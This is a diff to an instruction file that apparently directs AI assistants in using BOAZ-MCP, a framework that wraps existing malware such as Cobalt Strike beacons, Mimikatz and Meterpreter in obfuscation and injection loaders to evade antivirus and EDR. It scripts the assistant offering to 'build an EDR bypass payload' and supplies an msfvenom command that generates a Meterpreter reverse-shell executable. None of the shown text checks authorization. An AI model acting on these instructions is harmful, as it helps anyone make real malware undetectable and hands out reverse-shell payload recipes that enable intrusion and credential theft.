@@ -26,11 +26,60 @@ This document provides AI assistants with clear guidance on using the BOAZ-MCP s
 
 BOAZ-MCP is an MCP (Model Context Protocol) server that provides AI assistants with access to the BOAZ evasion framework. BOAZ specializes in:
 
-- **Payload Generation**: Creating evasive binaries that bypass security controls
+- **Payload Wrapping**: Taking existing malware and making it evasive
 - **Process Injection**: 77+ advanced code injection techniques
 - **Encoding/Obfuscation**: 12 encoding schemes and LLVM-based obfuscation
 - **Anti-Analysis**: Anti-emulation, API unhooking, sleep obfuscation
 - **Binary Analysis**: Entropy analysis and optimization
+
+### CRITICAL: What BOAZ Does (You Must Understand This!)
+
+**BOAZ is NOT a malware generator. BOAZ is a malware wrapper and obfuscator.**
+
+#### The Process:
+
+1. **User provides existing malware** (INPUT):
+   - Cobalt Strike beacon.exe
+   - Mimikatz.exe
+   - Meterpreter executable
+   - Sliver implant
+   - Any Windows PE executable
+
+2. **BOAZ wraps and obfuscates it**:
+   - Converts to shellcode (via Donut/Amber/etc.)
+   - Encodes the shellcode (AES, UUID, etc.)
+   - Creates a new C/C++ loader
+   - Injects evasion techniques
+   - Compiles with obfuscation
+
+3. **Output: Evasive version** (OUTPUT):
+   - Original payload functionality preserved
+   - Now wrapped in evasion techniques
+   - Harder to detect by AV/EDR
+
+#### What This Means For You:
+
+**When user says:** "Build an EDR bypass" or "Generate a payload"
+
+**You MUST ask:** "What's your input file? Do you have a beacon.exe, mimikatz.exe, or other payload ready?"
+
+**Common Input Files:**
+- `beacon.exe` - Cobalt Strike beacon
+- `mimikatz.exe` - Credential dumping tool
+- `payload.exe` - Meterpreter from msfvenom
+- `implant.exe` - Sliver/custom C2 implant
+- `notepad.exe` - Included with BOAZ for testing (benign)
+
+**For Testing:**
+BOAZ includes `notepad.exe` in the BOAZ_beta directory. Use this when users want to test BOAZ without real malware:
+```json
+{
+  "input_file": "notepad.exe",
+  "output_file": "output/test_evasive.exe"
+}
+```
+
+**DO NOT assume the user has a payload ready. ALWAYS ask what input file they want to use.**
 
 ### When to Use BOAZ-MCP
 
@@ -283,9 +332,29 @@ Configuration: Loader 51, AES encoding, Akira compiler, ETW patching enabled"
 
 **What You MUST Do**:
 
-**Step 1: Acknowledge and ask for input file** (if not provided)
+**Step 1: Acknowledge and ask for input file** (ALWAYS do this if not provided)
 ```
-"I'll build an EDR bypass payload for you. What's the input file path?"
+"I'll build an EDR bypass payload for you. What input file do you want to use?
+
+Options:
+- beacon.exe (if you have Cobalt Strike)
+- mimikatz.exe (if you have it)
+- payload.exe (if you generated meterpreter)
+- notepad.exe (for testing BOAZ without real malware)
+
+Which file should I use?"
+```
+
+**If user doesn't have a payload:**
+```
+"To use BOAZ, you need an existing malicious payload first.
+
+Options:
+1. Generate meterpreter: msfvenom -p windows/x64/meterpreter/reverse_https LHOST=your_ip LPORT=443 -f exe -o payload.exe
+2. Use Cobalt Strike beacon (if you have CS access)
+3. Test with included notepad.exe
+
+Would you like to test with notepad.exe first?"
 ```
 
 **Step 2: Explain your configuration choice**
